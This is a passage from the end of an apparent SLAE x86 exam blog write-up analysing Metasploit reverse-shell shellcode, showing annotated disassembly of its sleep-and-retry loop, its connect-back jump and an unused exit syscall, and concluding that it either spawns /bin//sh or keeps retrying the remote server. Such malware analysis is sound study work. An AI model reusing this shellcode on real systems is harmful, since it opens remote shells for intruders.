                            <span class="c1">; push the value of `tv_nsec` to the stack</span>
                            <span class="c1">; sleep 0 nanoseconds</span>
<span class="err">00000084</span>  <span class="err">53</span>                <span class="nf">push</span> <span class="nb">ebx</span>  

                            <span class="c1">; push the value of `tv_sec` to the stack</span>
                            <span class="c1">; sleep 10 seconds</span>
<span class="err">00000085</span>  <span class="err">6</span><span class="nf">A0A</span>              <span class="nv">push</span> <span class="kt">byte</span> <span class="o">+</span><span class="mh">0xa</span>

                            <span class="c1">; clear EAX and EDX</span>
<span class="err">00000087</span>  <span class="nf">F7E3</span>              <span class="nv">mul</span> <span class="nb">ebx</span>

                            <span class="c1">; 1st argument of nanosleep():</span>
                            <span class="c1">;   pointer to a timespec structure</span>
<span class="err">00000089</span>  <span class="err">89</span><span class="nf">E3</span>              <span class="nv">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">esp</span>
</code></pre></div></div>
<p>Once the shellcode sleeps <code>10 seconds</code>, it goes back attempting to connect to the remote server (address <code>00000014</code>):</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                            <span class="c1">; go back to 00000014 (to connect to the remote server)</span>
<span class="err">0000008</span><span class="nf">F</span>  <span class="nv">E980FFFFFF</span>        <span class="nv">jmp</span> <span class="mh">0x14</span>

                            <span class="c1">; apparently, this instruction is never going to be executed </span>
<span class="err">00000094</span>  <span class="nf">C3</span>                <span class="nv">ret</span>
</code></pre></div></div>
<p>Finally, there are some instructions that call the syscall <code>exit()</code>, in order to exit gracefully.</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                            <span class="c1">; call exit() syscall</span>
<span class="err">00000095</span>  <span class="err">31</span><span class="nf">C0</span>              <span class="nv">xor</span> <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
<span class="err">00000097</span>  <span class="nf">B001</span>              <span class="nv">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0x1</span>
<span class="err">00000099</span>  <span class="nf">CD80</span>              <span class="nv">int</span> <span class="mh">0x80</span>
</code></pre></div></div>
<p>From what it seems, this last syscall is never executed. In fact, there are only two possibilities:</p>
<ul>
<li>executes <code>/bin//sh</code></li>
<li>loops forever, sleeping <code>10 seconds</code> and trying to connect to the remote server</li>
</ul>
<p>Perhaps these instructions were added for conformitiy with other Linux executable, as a way not to <em>stand out</em>.</p>


            <footer class="tags">
                <section class="mono tags">
                    Tagged

                    
                    <a href="/tags#/tags/slae/">slae</a>, <a href="/tags#/tags/assembly/">assembly</a>, <a href="/tags#/tags/nasm/">nasm</a>, <a href="/tags#/tags/c/">c</a>, <a href="/tags#/tags/exam/">exam</a>, <a href="/tags#/tags/shellcode/">shellcode</a>, <a href="/tags#/tags/x86/">x86</a>, <a href="/tags#/tags/metasploit/">metasploit</a>
                </section><section class="pagination">
                        <a href="/22/01/04/slae32-assignment-6_1">
                            <div class="mono">NEXT</div>
                            SLAE x86 Exam - Assignment #6 Part 1
                        </a>
                    </section><section class="pagination">
                        <a href="/21/12/25/slae32-assignment-5_3">
                            <div class="mono">PREVIOUS</div>
                            SLAE x86 Exam - Assignment #5 Part 3
                        </a>
                    </section></footer>
        </main>
    </article>
  </body>
</html>
